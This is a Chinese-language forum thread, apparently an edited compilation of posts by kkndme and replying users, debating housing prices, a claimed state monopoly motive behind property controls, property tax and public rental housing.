<p>你拿一个错误的现象，说这个现象是正确的来证明你错误的房价观念是正确的，可笑！</p>
<p><strong>kkndme:</strong></p>
<p>事情不能简单用正确还是错误来评价，一件事物发生一定有发生的原因。你说皇帝统治老百姓，想杀谁杀谁是正确还是错误？如果是错的，但是却在中国延续了几千年。</p>
</blockquote>
<p>尽管炒房和公立幼儿园加价成为普遍的社会现象是令人痛心的，但它们不以刚需人群的意志为转移的存在着，且与泡沫无关。</p>
<h4 id="最被提及与泡沫有关的是以下两点："><a href="#最被提及与泡沫有关的是以下两点：" class="headerlink" title="最被提及与泡沫有关的是以下两点："></a>最被提及与泡沫有关的是以下两点：</h4><h5 id="第一：中国的房价甚至高于某些发达国家的房价。"><a href="#第一：中国的房价甚至高于某些发达国家的房价。" class="headerlink" title="第一：中国的房价甚至高于某些发达国家的房价。"></a>第一：中国的房价甚至高于某些发达国家的房价。</h5><p>其实，众所周知的是：不光房价高于某些发达国家，石油，高速，教育，医疗，税收等费用都远远高于某些发达国家。</p>
<p>而且中国的精英人群尽管所占比例不大，但是绝对数量足够大，而且精英平均收入甚至远远高于某些发达国家的收入水平。</p>
<h5 id="第二：租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。"><a href="#第二：租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。" class="headerlink" title="第二：租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。"></a>第二：租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。</h5><p>这个问题不用过多解释，使租售比更合理的方法不是只有降低房价一种，还有一种更靠谱的：房租大幅度上涨。而且已经在行动中。房租长期保持低价就像1990年以前的和田玉长期保持低价一样不可能。</p>
<h3 id="4、房价上涨造成物价上涨，人民生活变得困难"><a href="#4、房价上涨造成物价上涨，人民生活变得困难" class="headerlink" title="4、房价上涨造成物价上涨，人民生活变得困难"></a>4、房价上涨造成物价上涨，人民生活变得困难</h3><p>这个问题其实也不用多解释，懂经济学的该明白自然会明白，不会轻易被忽悠，不懂的解释半天也不会明白。</p>
<p>简单的可以这样说，物价上涨是经济过热，钞票印多了的后果。而房地产因为稀缺性和易保存比较吸金，所以吸收了大量的钞票，以至于大家光看到了房地产的飞涨。</p>
<blockquote>
<p><strong>liougehooa:</strong></p>
<p>房价高涨，你要发的钞票必须要多，不然怎么去买房子？你发的钞票越多，钞票不是你发下来去买房子就死掉了不流通了，它只要流到人的口袋或者银行的口袋，这钱立马回出现流动，能不造成通货膨胀吗？除非这笔钱收到后限制房东使用。<br>为了支持高房价，国家必须发大量货币，这也是去年房价高涨的原因。</p>
<p><strong>kkndme:</strong></p>
<p>请先了解一下中国的货币发行制度，人可以无知，但不可以乱说。让人笑话。</p>
</blockquote>
<blockquote>
<p><strong>tianxiaobing11:</strong></p>
<p>中国可以无限印钞票吗？有没有个限度呢？我是请教楼主，肉食者会怎么思考呢？他们的幕僚能从历史中找到答案吗？楼主的历史资料库中有这方面的吗？</p>
<p><strong>kkndme:</strong></p>
<p>如果你收集过铜钱，你会发现有一种大钱叫一当十五。这就是中国古代的铸钱方式。当铜不够了，zf用铸造2枚铜钱的铜铸造一枚大钱当作十五个大钱用。那时还没有纸币，所以采取了这种方法。<br>到了解放战争时期，物品紧缺，国军大量印制金圆券，今天用一捆钱没一斤米，明天用同样一捆钱却只能买一两米。当然这种金圆券无限制满天飞也和我军大量投放伪币有关。<br>当物质紧缺时，必然会通过发行纸币来缓和矛盾。小时候我常去买2毛钱的肉馅包一顿饺子，现在2毛钱仍在大街上也没人捡。肉馅从2毛钱涨到4块钱，货币贬值了20倍。为什么我们认可肉馅从2毛钱涨到4块钱的既定事实，但是却不能想象现在的物价会在未来的10年再涨20倍呢。<br>如果你收集过邮票，会发现50年代的老有票的票面价格都是500元一张，1000元一张，我们建国后的货币也并不是一开始就是圆角分的。50年代圆是最基本的货币单位，随便买个最小的东西，都是1000元起步的，很象现在的越南盾。<br>我们国家的印钞制度，主要跟外汇挂钩，在帖子里已经做过了描述，你可以在帖子里找一找。正是由于国内商品的内需不足，完全依靠低附加值商品出口创汇，才造成了人民币的外升内贬。</p>
</blockquote>
<p>其实如果房地产交易量下降，不再具有吸金功能，那么农产品等生活必须品以及房屋租金等等就会大幅上涨。这是因为多出来的大量钞票总要有个流向，如果不被房地产吸收，就会被大蒜，绿豆，姜，及全部生活必须品的上涨来吸收</p>
<p>事实也证明确实如此。2010年房产调控后，物价上涨的势头非常迅猛。</p>
<h2 id="房地产调控的真正意图（通过垄断获取利益最大化：国富民穷）"><a href="#房地产调控的真正意图（通过垄断获取利益最大化：国富民穷）" class="headerlink" title="房地产调控的真正意图（通过垄断获取利益最大化：国富民穷）"></a>房地产调控的真正意图（通过垄断获取利益最大化：国富民穷）</h2><p>防范金融风险？不错，你说的很对，但是没这么简单。</p>
<p>辨别利益是看透一切事物真相的武器。</p>
<p>高房价谁是受益者？</p>
<blockquote>
<p>房地产游戏的模式三个环节：dfzf卖地、银行贷款、开发商在二级市场销售</p>
<p>dfzf卖地之后，剩余的风险和收益都归银行和开发商</p>
<p>dfzf卖地的款则用于地方广场，地铁，公路之类的建设和权贵的挥霍。</p>
<p>dfzf只负责卖地，是无风险的买卖。</p>
<p>只要房价不断上涨，加杠杆的炒房客就会赚到盆满钵满</p>
</blockquote>
<p>这么分析下来，最受益的是地方政府、开发商、炒房客。</p>
<p>独独缺了zy。</p>
<p>这时你是否猜到zy为什么要调控？如果还猜不到没关系，听我道来。</p>
<p>纵观古今在位者最不能容忍的是别人受益，自己被黑锅。</p>
<p>大kfs，小kfs，大炒房客，小炒房客，dfzf都是收益者，但是风险却由zy来抗。这是一笔很不划算的买卖。</p>
<p>而房地产混战的局面，造成了国家队央企成员只有凭财大气粗高价拿地的份，钱花的最多，风险却抗的最大。</p>
<p>zy深深的感觉到要想国家队受益，要想控制风险只有做到两个字：垄断。</p>
<p>提高资金门槛，让小kfs，小炒房客，有点钱的小老百姓推出这个游戏。房地产很好玩，但不是小人物应该玩的。</p>
<p>先让市场冷静，彻底整顿，踢出那些个跳梁小丑，然后国家队出马，绝对垄断的市场，才能够统一定价，才能够控制风险，才能够利润最大化。</p>
<p>既然油价高于美国是合理的，那麽房价高于美国一定也是合理的，关键在于垄断。</p>
<p>不仅仅是房价的垄断，因为过高的垄断定价将会使交易量下降，国家队也需要资金周转。</p>
<p>真正厉害的，还是房租的垄断。公租房的推出是房租垄断进程的里程碑。</p>
<p>至于苦等廉租房的同志，不要抱太大的希望。城市要建设，地铁，广场，政府大楼都要上马，钱从哪里来？不会无缘无故凭空出来。</p>
<p>想想小学就近上学，但是重点小学真的就近就能上吗？小学名额可以寻租，经适房，廉租房也是一个道理。</p>
<blockquote>
<p><strong>tjOOSAN:</strong></p>
<p>真扯啊~~~ 油价跟房价去比？？</p>
<p>这位kkndme ，你就别忽悠了！~~ </p>
<p>汽车对于百姓而言，可有可无，油价涨到是美国的一百倍，中国百姓才高兴了。</p>
<p><strong>kkndme:</strong></p>
<p>这位兄弟，您比那些希望钱钱去炒大米的还不靠谱。</p>
<p>石油影响的不仅仅是开车的人花费多了。疯狂上涨的运输成本会导致民不聊生的。</p>
<p>假设一斤蔬菜从广西的农民地里收购是0.5元一斤，但是由于油价的像你说的上百倍的涨，运到北京，这斤蔬菜要卖300块一斤。</p>
<p>社会就瘫痪了</p>
<p>我们为确实买不起房的低收入群体，只能感到无奈</p>
<p>但有些本来能买房却嫌这嫌那而不买房的傻空同志，我们只能说你买不起房，完全是自己的原因，连油价上涨意味着什么都搞不懂，贫穷真的不能怨别人。</p>
</blockquote>
<blockquote>
<p><strong>tjOOSAN:</strong></p>
<p>大哥！房子是必须品。ok？那么既然你也认为政府的钱大多从地产来。</p>
<p>那么这种发展正常嘛？会持续吗？？没有实体经济，能行吗？</p>
<p>招你的法子说，炒楼才是中国的前途？</p>
<p><strong>kkndme:</strong></p>
<p>实体经济的发展不是简单的钱不去投资房产，就会去投资实体经济，实体经济就发展起来了。估计媒体洗脑洗的比较厉害，你中毒了。</p>
<p>资本是趋利的。无论是哪个国家，哪个社会，只要存在市场经济，这个道理就一定不会错。</p>
<p>为什么资金进入房地产及其他资本市场而逃离实体经济？是因为实体经济环境不好，不赚钱。</p>
<p>一是税赋太高;<br>二是各种需要打点孝敬的部门、管理人员、工作人员太多，比税赋还高，不能承受之重;<br>三是国家队在各个重要领域的垄断，使国企变成了变相税务局的职能，垄断企业的暴利定价，又是压在本应该蓬勃发展的实体经济上的又一座大山。</p>
<p>现在央企基本是不垄断的行业不做，把产能过剩，充分竞争的产业交给民间资本，并且还要给这些资本压上高昂的负担.</p>
<p>有可能垄断的行业包括房地产都会收到国家队手里，以后更是将发展成为一个高度垄断的社会。</p>
<p>资本不是傻子，一定会趋利，所以资本放弃了操心受累不挣钱的实体经济，转而投向房地产。房地产的调控，让资本又进入了黄金、农产品领域参与爆炒，反正就是不进实体经济。因为国家不给实体经济的环境做任何的改善。</p>
<p>如果实体经济有一个好的环境，有一个好的获利空间，大量的资金就不会撤出实体经济，没有资金潮涌般的投入房地产市场，中国的房地产将会是一个平稳的上涨趋势。</p>
<p>但是体制决定了资金的去向，不以人的意志为转移。</p>
<p>高税赋、暗箱成本及垄断不但造成巨大的贫富差距，而且将会导致生活成本的大幅提高，生活负担日益沉重。</p>
<p>一方面百姓生活负担的加重，导致一些非生活必须品严重产能过剩，将会出现大量亏损倒闭的内需企业。</p>
<p>另一方面精英阶层快速聚集大量财富，使奢侈品供不应求。古董，字画，玉器，豪车，顶级服装的消费比重也将越来越大。</p>
<p>但是能够容纳大量资金的只有两个领域：农产品领域（满足老百姓的肚子）和商品房领域（居住权要满足老百姓的需求，产权要满足精英阶层的需求）。</p>
<p>资金的流向只能疏导不能强堵，zf很明白这个道理。两者危害取其轻，你认为zf会选择哪个领域？</p>
</blockquote>
<p>总结一下：</p>
<ul>
<li><p>调控的根本原因是zy在房地产的游戏中没有得到好处。调控是为了让zy的国家队参与进来，成为主体。</p>
</li>
<li><p>垄断的目的还在于能够控制价格，为了维稳，zy是不希望暴涨的，但也不希望不涨。</p>
</li>
</ul>
<h2 id="说到房产泡沫的问题"><a href="#说到房产泡沫的问题" class="headerlink" title="说到房产泡沫的问题"></a>说到房产泡沫的问题</h2><h3 id="1、先说说官方的统计数据。-选择性失明"><a href="#1、先说说官方的统计数据。-选择性失明" class="headerlink" title="1、先说说官方的统计数据。(选择性失明)"></a>1、先说说官方的统计数据。(选择性失明)</h3><p>官方的统计数据从来是可以很雷，但不可以很真。</p>
<p>我们的统计原则基本就是：村骗乡，乡骗县，一骗骗到国务院。</p>
<p>不知道有人去市、县、乡、村进行过社会调查没有？</p>
<p>社会调查是怎么一回事？</p>
<p>我来告诉你，所有的关于人口、收入、田地、贫困户的数据都是官方统一编写，统一口径，如果胆敢有哪个小民对调查人员乱说，那是吃不了兜着走的。</p>
<p>你问了数据编来编去的意义在哪里呢？</p>
<p>意义很大，起码跟向上申请拨款是关系非常密切的。数据不假，钱从哪来？</p>
<p>统计数据无所谓是否真实并不重要，重要的是它是或缺利益的重要手段。</p>
<p>假设官方想证明房地产不存在泡沫，那么一定拿的出不存在泡沫的统计数据作证。</p>
<p>反之，也一样。</p>
<p>好比,CCAV为了证明高空置率的结论，派出记者专门找偏远且刚刚完工的楼盘，进行了一次纯粹为了证明内部已事先得出结论的毫无科学依据的调研。</p>
<p>而dfzf，为了证明刚需多么强劲，也立刻拿出了选择性失明的统计数据来进行回击。</p>
<p>无论是左还是右，同样都是不科学，都是现有结论，再有证据。</p>
<p>我们到底应该信谁</p>
<blockquote>
<p><strong>cdwl:</strong></p>
<p>商品房本来名字中就有商品二字不准投资岂不是笑话？<br>真正不准投资的那叫公房，这才是保证老百姓有房住的关键，商品房诞生的时候就很明确是改善居民居住条件的，现在政府怪商品房价格过高造成老百姓没房住本来就是颠倒黑白.<br>政府不造保障老百姓居住的公房，而让老百姓去购买改善居住条件的商品房来解决本该政府解决的居住问题，政府不作为才是造成老百姓出现居住问题的罪魁祸首。<br>我不期望人人有房，我只希望每一个在城市里找到工作的人通过努力工作勤俭持家能在生活城市里有希望拥有一套安稳的房子来容身，不管这房子的性质是商品房、经适房、廉租房或者其他什么房子。</p>
<p><strong>kkndme:</strong></p>
<p>你说的正是根源所在啊<br>zf的职责应该向无房者提供的保障房，建成经适房、两限房，被权贵占有牟利，<br>而非要把商品房赋予稳定社会的职能。<br>zf不是不知道问题的根源，而是不愿意放弃巨大的利益</p>
</blockquote>
<h2 id="房地产调控工具：房产税？"><a href="#房地产调控工具：房产税？" class="headerlink" title="房地产调控工具：房产税？"></a>房地产调控工具：房产税？</h2><p>当然还有人企图利用流氓无产者和无知群众的群情激奋来进一步收取房产税来提高dfzf收入。</p>
<p>税收从来都是向下游转嫁的，zf多收出来的钱一定是通过最下游的房租来体现。</p>
<p>当然，也有很多明白人士大声疾呼反对房产税。</p>
<p>自古而今，即使最辉煌的朝代，最被广大群众津津乐道的太平盛世，普通群众也仅仅只是解决了温饱而已，包括贞观、文景、康乾。</p>
<p>国家的富庶都是以老百姓勒紧裤腰带为代价的。</p>
<p>所以，zf是不会理会部分明白人反对房产税的呼声的。</p>
<p>真正对房产税的顾及来自于dfzf对土地出卖前途的担忧，真是鱼与熊掌不可兼得。</p>
<p>尽管流氓无产者和无知群众的呼声很高，然而房产税征收一旦实际操作起来，就会变的不得人心，征收难度非常之大，实际效果难以预知。</p>
<p>也就是说zf没有底。而如果房产税征收效果不佳，dfzf卖地收入再受到巨大影响，那就真正是得不偿失了。</p>
<p>就会变成赔了夫人又折兵。</p>
<p>这样的买卖，zf是不会轻易做的</p>
<p>房地产的现状是，商品房二级市场是由各种类型的开发商自由竞争的，一手房开发商之间的竞争，二手房投资客之间的的竞争。</p>
<p>房价为什麽在一个自由竞争的市场上能够持续上涨？因为稀缺性。不是房屋的稀缺性，而是房屋所必须占用的土地的稀缺性。</p>
<p>有些群情激奋的群众立刻以6500万套房子空置的事情提出质疑，还有ccav的报道，那是要多煽情又多煽情。</p>
<p>我们无需说6500万套的真实性（明白人都知道非常离谱）和空置率的科学性。</p>
<p>为什么不说，因为这种稀缺性跟空置率就完全没有关系。商品房的稀缺性是相对人民币而言的。人民币印多了，资金没地方去，商品房就涨价了。</p>
<p>垄断的市场是没有风险的，土地是完全垄断的，所以dfzf完全没有风险。</p>
<p>而商品房是自由竞争的市场，是具备风险属性的，尽管由于大量印钞造成了商品房的飞涨，但随着房价的高涨，风险也在积聚。</p>
<p>dfzf土地垄断没有风险，完全可以置身事外。</p>
<p>可是银行呢？属于国家的银行。</p>
<p>银行正在承担自由竞争市场房价高涨积聚的风险。</p>
<p>这是zy不允许看到的，dfzf受益，而风险全部甩给zy。</p>
<p>既然垄断的市场是没有风险的，那还是让房屋和土地一起垄断好了。</p>
<h2 id="垄断还可以解决一个问题：社会稳定。"><a href="#垄断还可以解决一个问题：社会稳定。" class="headerlink" title="垄断还可以解决一个问题：社会稳定。"></a>垄断还可以解决一个问题：社会稳定。</h2><p>常被媒体和群情激奋群众所提及的一个重要问题就是:房价收入比。</p>
<p>大量印刷的人民促成了房价高企（因为商品房实在是具备了大资金需要的所有投资品属性），可是那些个巨额的资金普通老百姓并没有见到。</p>
<p>路人甲：我们一个月就挣2000多块钱，干一辈子买不起房啊。</p>
<p>路人乙：我一个月上万都买不起房。</p>
<p>媒体：一个家庭不吃不喝22年买一套房</p>
<p>大量的疯狂印刷的人民币在哪里呢？</p>
<p>在精英手里。</p>
<p>我们在回顾一下开篇，我们奉行的是精英社会，丛林法则，金字塔式收入结构。</p>
<p>人民币再多，也不可能流到金字塔的底端。</p>
<p>dfzf垄断卖地也就让百姓们发发牢骚。</p>
<p>而炒房客，kfs赚的盆满钵满就让生活在中下层的老百姓眼红和不能容忍。</p>
<p>不患寡而患不均啊。</p>
<p>垄断，国家队的垄断，可以解决眼红问题，也就是社会稳定问题。</p>
<p>还有一个最重要的问题：银行和民营开发商之间，是官与民之间的问题。</p>
<p>而银行和国家队央企，是左兜和右兜的问题。</p>
<h2 id="如何垄断房屋、房租？"><a href="#如何垄断房屋、房租？" class="headerlink" title="如何垄断房屋、房租？"></a>如何垄断房屋、房租？</h2><p>土地是垄断的</p>
<p>然而房屋垄断并不是一件容易的事情。</p>
<p>因为民间百姓手里是存在大量二手房的.当然这也是为什么调控的板子只打在二套房、投资客、炒房客身上的原因。</p>
<p>同样，房租的垄断也并不是一件容易的事情，因为民间百姓手中的大量二手房都具备出租的特性。</p>
<p>俗话说，问渠哪得清如许，唯有源头活水来。</p>
<p>要垄断，必须抓住源头。</p>
<p>源头在哪里？</p>
<p>在一级市场，而不是二级市场。</p>
<p>房地产的垄断就是要国家队从一级市场做起，从一级市场开发着手完成对商品房开发的垄断。</p>
<p>一级市场，那是一个高高的门槛，民间资金，就让他该干嘛干嘛吧，房地产不是你玩的。</p>
<p>一级市场包括的内容是一般开发商无法参与的：</p>
<p>城市规划，城中村改造，旧房拆迁，城市综合体开发。</p>
<p>可以说从规划、改造拆迁、开发、到二级市场销售，一条龙服务。</p>
<p>一级市场开发的最大特点就是可以创造需求：你不是有房子吗？我拆掉你的房子，看你有没有刚需。</p>
<p>国家垄断控制风险的意义还在于：需求可以拆出来。</p>
<h2 id="国家垄断带来的影响"><a href="#国家垄断带来的影响" class="headerlink" title="国家垄断带来的影响"></a>国家垄断带来的影响</h2><p>以后的路，民营开发商的日子将变得越发艰难。</p>
<p>土地是dfzf的，商品房开发是央企和国企的。</p>
<p>处于金字塔下层的40%家庭，如果还没有一套自己的房子，那么买一套自己的房子就越发的变得不可能。</p>
<p>商品房将逐渐往金字塔的上层积聚。</p>
<p>处于金字塔下层40%的无房家庭将只能以租房来解决居住问题。</p>
<p>租金的快速上涨期即将到来，zf已经盯上了房租这块巨大的蛋糕。因为房租的收益比房产税更靠谱，更具有操作性。</p>
<p>公租房，呼之欲出</p>
<blockquote>
<h4 id="政府是否会考虑民生问题："><a href="#政府是否会考虑民生问题：" class="headerlink" title="政府是否会考虑民生问题："></a>政府是否会考虑民生问题：</h4><p><strong>sunxinmfc:</strong></p>
<p>政府无需考虑民生问题么，本次号称史上最严厉的打压政策再起不到一点效果，ZF威信力将进一步下降，需要仔细考量</p>
<p><strong>kkndme:</strong></p>
<p>自古以来，民生问题的底线就是不要出现陈胜吴广的极端情况。所以zf更在意的是农民问题。</p>
<p>因为历史的改朝换代都是大饥荒引起的，无论是汉末、唐末、隋末、还是明末。农产品价格上涨的对zf的震动要远远大于房价的上涨。</p>
<p>农民具备最原始的力量，而他们关心的并不是三线以上城市的房价，而是能否填饱肚子。</p>
<p>而关心自己能否拥有一套产权房的都市白领，除了呻吟一下意外，几乎是没有什么有效反抗的可能的。</p>
<blockquote>
<p><strong>sunxinmfc:</strong></p>
<p>秀才造反，三年不成，自古已然。</p>
<p>但我们还没有谈到所谓“造反”的地步，只是说房价如你所述，暴涨，中国的中产和以上人士将进一步携款合法外流（在房价暴涨的09年，中国外流人口达到历史峰值）。</p>
<p>这一部分人利益如何保证？您觉得zf不需要考虑对么？</p>
<p><strong>kkndme:</strong></p>
<p>现在社会跟几百年前最大的不同是，世界是开放的，这得益于地理大发现和世界经济一体化，即使缅甸朝鲜这样封闭的国家也免不了受到来自世界范围的影响。大一统的集权社会融入了西方民主的思想，同时互联网的出现也让人们对过去的思维进行了再思考。</p>
<p>尽管底层百姓出国还是一个梦想，但对于精英人群，基本上是在世界范围自由流动的。</p>
<p>中国自古以来，商人都是没有地位的，商人的财产可以随时被官员没收，自古如此，至今如此，即使是今天也并没有出现私人财产神圣不可侵犯的宣言。即使出现了，也没有任何可以操作的可能。</p>
<p>明朝以后大量的商人移居海外成了华侨，现今的商人为了安全移居海外也不是什么新鲜事，不过是步明朝华侨的后尘罢了，zf会真的放在心上吗？朱元璋没有放在心上，朱棣没有放在心上，现在同样也不会放在心上。</p>
<p>真正可怕的是官员一方面谋取私利一方面把亲属和存款送到国外，这其实是一种国家背叛。在国内榨干老百姓的血汗，得到的金钱却在国外挥霍。什么叫卖国，不过如此。</p>
<p><strong>connstr：</strong></p>
<p>假如商人可以移居海外，官员自然也可以。官商能分家吗？</p>
<p><strong>kkndme：</strong></p>
<p>商人还是要分的吧：红顶商人就是官商，统治阶级，那是上位者。普通商人，比如开个袜子厂赚个辛苦钱，最后袜子厂不挣钱了，官员还天天找他，让他孝敬，他就只好移民了。普通商人在中国也是海量的，有点钱，但是没一点地位。</p>
</blockquote>
<p>中国自古以来都不是人人都能有属于自己的房子，大量的丫鬟、仆妇、管家、小厮寄养在权贵人家，身体都是不自由的，何谈拥有自己的房子。</p>
<p>自古以来，最多的就是失去土地的农民，住在地主家做长工，又何谈属于自己的房子。</p>
<p>只要是有贫富差距的社会，只要存在阶级，只要存在统治和被统治，这个社会就会不以人的意志为转移的出现大量的底层居民，没有这些底层居民。权贵就不能很好的生活。</p>
<p>为了权贵生活的更好，就要维持大量的底层群众。</p>
<p>权贵必须保证大量底层群众的基本生活，才能够让自己过得更舒服，仅此而已。这就是民生</p>
<p><strong>sunxinmfc:</strong></p>
<p>不得不说，你说的很对。</p>
<p>君不见，天涯上多少盼着被美军解放的铁杆准汉奸，政府楼被炸七成网民不是替死者默哀，而是一片欢呼。为什么会有这样的民意，参考前苏联，ZF确实应三思</p>
<p><strong>kkndme:</strong></p>
<p>爱国是与中华的历史分不开的，自秦统一以来，中国由封建时代转变为帝国时代，只有在项羽焚烧咸阳后，对诸侯进行了一次分封，但时间非常短暂，刘邦重新统一了天下，帝国时代经历了漫长的汉、唐、宋、元、明、清。天下一统的爱国情结是根深蒂固的。</p>
<p>而在秦以前，与中世纪的欧洲是极为相似的，齐国人可以到秦国做宰相，赵国人可以到燕国做将军。中世纪法国的诺曼底公爵可以到英格兰继承王位，瑞典的贵族可以到基普做大公，封建时代的国家概念并不是明显。欧洲经历了漫长的封建时代，国家观念很淡薄，能够抛弃国家货币成立欧盟就是明证。这对于漫长帝国时代，天下一统的国家是很难想象的。</p>
<p>爱国只跟历史文化传统有关。</p>
<p>1978年越南入侵红色高棉，当时的红色高棉对内实行红色恐怖，以gongchanzhuyi的名义对全国700万人口进行奴役和屠杀，总共屠杀了100万人。当越南军入侵时，受到了广大柬埔寨群众的热烈欢迎，称越南军解放柬埔寨是解放人类的战争。</p>
<p>红色高棉失去了民心，必然败亡。</p>
<p>那时，为了支援红色高棉，中越战争打响。有我国的强力支持，红色高棉仍然走向败亡。</p>
</blockquote>
<blockquote>
<h4 id="政府分租房市场蛋糕："><a href="#政府分租房市场蛋糕：" class="headerlink" title="政府分租房市场蛋糕："></a>政府分租房市场蛋糕：</h4><p><strong>中年不惑吗:</strong></p>
<p>不过从政府要分租房市场的蛋糕而言，我有不同的看法</p>
<p>政府的公租房要想租出好价格，有两种方式</p>
<p>1）减少市场可出租房源（北京就这样干了，拆迁廉价城中村）<br>2）提高竞争房源的成本。（所以我认为推出房产税是大概率的事情，<br>因为政府的公租房是不需要交房产税的）</p>
<p>于是竞争房源的房租暴涨，政府的公租房也就可以羞羞答答的打个9折来<br>安抚一些底层了，反正所有的黑锅都有竞争房源的房东背了</p>
<p><strong>kkndme：</strong></p>
<p>房产税的问题我觉得zf还是慎重的</p>
<p>1、如果采用不公平法则：</p>
<p>公务员，垄断企业，事业单位的福利房不上税，权贵与利益集团购买囤积的大量商品房不上税，只有普通百姓上税，会加剧社会矛盾。</p>
<p>而房产税会大幅提升租金，在公租房没有大量建起来之前，对稳定不利，维稳才是第一要务。</p>
<p>2、如果实行公平法则</p>
<p>小产权房，福利房，权贵囤积房都要上税，执行难度太大，可操作性不强，阻力几乎难以逾越。</p>
<p>如果真的收房产税，采用不公平法则的可能性最大，普通的无房百姓生活将变得非常艰难。</p>
<p>3、维稳问题其实最终还是吃饭问题。</p>
<p>房价上涨可以不买，如果房租价格不能控制，农产品价格不能控制，一旦大批群众吃饭出现了问题，维稳就无从谈起了。这个底线，还是要严守的。</p>
<p><strong>中年不惑吗:</strong></p>
<p>对公租房的问题受教了</p>
<p>不过当前从来不存在什么公平正义</p>
<p>税收向来是穷人多交，富人不交或少交</p>
<p>不过我很感兴趣的是假如推出了房产税</p>
<p>政府采取何种方式收</p>
<p>难道是如同鬼子进村了，挨家挨户的收？</p>
<p>但鬼子本身就是房产税的征收对象（不然也当不了鬼子）</p>
<p>他们自己都抵制，难道还指望他们向屁民收</p>
<p>遇到那种要钱没有，要命有一条的主</p>
<p>难道政府还开拖拉机来收？</p>
<p>5年前就叫嚣对房租收个人所得税</p>
<p>到现在也没有个影了</p>
<p>操作性实在太差</p>
<h4 id="房产税征收的影响，以及为什么要征税？"><a href="#房产税征收的影响，以及为什么要征税？" class="headerlink" title="房产税征收的影响，以及为什么要征税？"></a>房产税征收的影响，以及为什么要征税？</h4><p><strong>kkndme：</strong></p>
<p>房产税无论是持有环节征收，还是交易环节征收都是要向最终租房人转嫁的。</p>
<p>好比鸡饲料上涨没有可能鸡肉不涨价，但是养鸡的并没有赚更多钱。</p>
<p>降低百姓租房困难的唯一国际通行办法就是减税。</p>
<p>但是减税，在我国是很难行的通的。</p>
<p>一个高增长高通胀的国家，高昂的腐败成本和巨大的浪费将导致国家必须维持高税收才能维持运转，gdp保8实际上是必须的也是迫不得已的。</p>
<p>维持正常的运转，维持庞大的消耗税收而不是创造税收的公务员队伍，没有gdp快速的增长怎么可能呢。</p>
</blockquote>
<h2 id="公租房问题"><a href="#公租房问题" class="headerlink" title="公租房问题"></a>公租房问题</h2><p>说到公租房问题</p>
<p>首先还是要提到我们实行的双轨制</p>
<p>从某一方面可以简单的理解为统治阶级内和统治阶级外。</p>
<p>也就是我们常说的体制内，体制外。</p>
<p>体制内：公务员、垄断企业及医院高校科研院所等事业单位。</p>
<p>体制外：外资、私企打工者，个体工商户，农民，这里面也应当包括高层的老板和最底层的长期无业人员。</p>
<p>我们感受最深的就是涨工资的问题，一旦政府涨工资，那就一定是体制内涨工资，跟体制外完全没有关系。</p>
<p>在金融危机的08年，大批企业关门，减薪，裁员，美国欧洲因为钱紧不得不降低公务员薪水。而这时，我们神奇的国家在干一件事：公务员普遍加薪，是为了全国百姓着想—刺激消费。</p>
<p>还有保障房问题，这个也是我们感受最深的：保障房&#x3D;公务员及垄断企业住房；解决住房问题变成了如何让领导干部住更多更大的房子，如何让体制内员工拥有足够舒适住房的问题。</p>
<p>体制外的群众，那是别想得到一点好处的。谁让你是被统治阶级呢。</p>
<p>公租房的推出，也要解决两个问题：<br>1、体制内的最下层（最下层也是统治阶级，也就是是古代官吏中的吏）员工的基本住房问题。<br>2、向体制外被统治的小民稳定收钱的问题。</p>
<p>在私企打过工的都知道，毫无归属感可言，老板脑袋一发热，随时让员工卷铺盖卷走人。</p>
<p>那是要多没保障有多没保障。原因是社会关系，关键客户，都掌握在老板一个人手里，员工就是打个下手，一不爽了，就换人呗。</p>
<p>统治者可知道不能这么用人的。一个庞大的国家机器要想正常运转，必须得让手下的和自己的利益一致。如果自己吃肉，手下的连汤都没得喝，这个机器就转不动了。</p>
<p>因此，在房价高涨的时代，保障房才成为zy默认的公务员房、垄断企业房。</p>
<p>公租房首要解决的就是手下里面最底层人士的住房问题。</p>
<p>我认为针对于体制内来说，无论是公务员，事业单位，还是国有企业的初级员工，都可以通过所在单位申请公租房，公租房的租金会略低于市场，主要是单位一定会提供补贴。</p>
<p>体制外对公租房的申请就没有那么幸运了。</p>
<h2 id="如何解决建公租房的钱从哪儿来的问题？"><a href="#如何解决建公租房的钱从哪儿来的问题？" class="headerlink" title="如何解决建公租房的钱从哪儿来的问题？"></a>如何解决建公租房的钱从哪儿来的问题？</h2><p>钱的问题，dfzf也想到了解决的办法。</p>
<p>在卖地时就要求开发商配套建设一定比例的经适房、廉租房或公租房。</p>
<p>然而，羊毛出在羊身上，开发商不可能做赔本的买卖。</p>
<p>经适房好说，反正是卖个住户，大不了利润很低，顶多挣得少点。</p>
<p>而廉租房和公租房就纯粹是只见投入不见产出的（开发商可没资金没耐心收租子）。</p>
<p>廉租房和公租房的建设成本必须加到所建的商品房身上，这肯定会抬高房价。</p>
<p>关键是拿地成本逐年上涨，孝敬的资金也在逐年上涨，在加上多出来的廉租房和公租房建设成本，房价不可能无限抬高的。开发商也需要资金回笼周转。</p>
<p>房价越高风险越大只是无论zf，开发商，炒房客和买房群众都有的共识。</p>
<p>只是房价多高才是高，不同的人理解是不同的。</p>
<p>显然，把大量廉租房和公租房的建设寄托在开发商配套身上是完全行不通的，不仅不能解决住房问题，还让本来就高企的房价更加雪上加霜。</p>
<p>体制内公务员、垄断企业和事业单位的员工住房问题是不难解决的，因为有zf行为的强制意志在里面。</p>
<p>1、df划拨土地，征集开发商建经适房、公租房</p>
<p>2、dfzf强制要求开发商建配套经适房、公租房，建设成本就转嫁给购买商品房的冤大头吧。</p>
<p>3、体制内单位自有土地，集资建房。</p>
<p>多管齐下，体制内人员的住房不难解决，甚至体制内人员每人住好房子大房子多套房子的问题都不难解决。处于金字塔的中上层，他们俯瞰着芸芸众生。</p>
<p>处于金字塔下层的体制外的广大群众怎么办？</p>
<p>体制内员工的住房舒适性和投资获利是首要保证的，不然光让干活不给好处，怎么能让手下听话呢？</p>
<p>体制外广大群众的住房问题也要解决，这关系到社会稳定。</p>
<p>能不能拿出一个办法，即解决了群众住房问题，又可以从群众手里长期获取收益？</p>
<p>细水长流收租子的事情开发商做不了，但zf可以做。</p>
<p>公租房，如果解决了钱的问题，面向广大群众的公租房的推出，将会取得双赢的局面。</p>
<p>既然房地产开发最肥的肉留给了国家队，国家队也应该投身到公租房的建设中来。</p>
<p>国家队全面进场之前，大鱼小鱼虾米泥鳅，皆可得利。</p>
